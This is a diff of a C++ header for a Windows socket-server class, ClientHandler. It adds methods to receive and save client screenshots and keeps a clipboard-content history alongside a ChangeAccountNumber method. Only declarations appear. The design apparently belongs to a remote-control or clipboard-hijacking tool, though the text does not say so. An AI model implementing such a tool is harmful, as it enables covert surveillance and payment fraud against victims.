@@ -8,11 +8,12 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <iphlpapi.h>
-#include "SocketListener.h"
+#include "SocketListener.hh"
 #include <iostream>
 #include "WinapiHelpers.hh"
 #include "ClientHandler.hh"
 #include "IpAddress.hh"
+#include "Socket.hh"
 
 
 
@@ -22,17 +23,18 @@ class ClientHandler
 public:
 	explicit ClientHandler(SOCKET clientSocket);
 	~ClientHandler();
-	std::string RecvString(const Metadata& metadata);
 	void RecvClipboardString(const Metadata& metadata);
-	int SendMetadata(Metadata metadata);
+	std::vector<char> RecvScreenshotAsJpgBytes(const Metadata& metadata);
+	void SaveScreenshot(const std::vector<char>& screenshot);
 	void Handle();
-	void ChangeAccountNumberAsync(std::string accountNumber);
-	Metadata RecvMetadata();
+	void ChangeAccountNumber(std::string accountNumber);
+	void GetScreenshotCmd();
+
 
 private:
-	int Send(const char* data, int size);
 	SOCKET clientSocket;
 	std::vector<std::string> clipboardContentHistory;
 	IpAddress ipAddress;
+	Socket socket;
 };
 
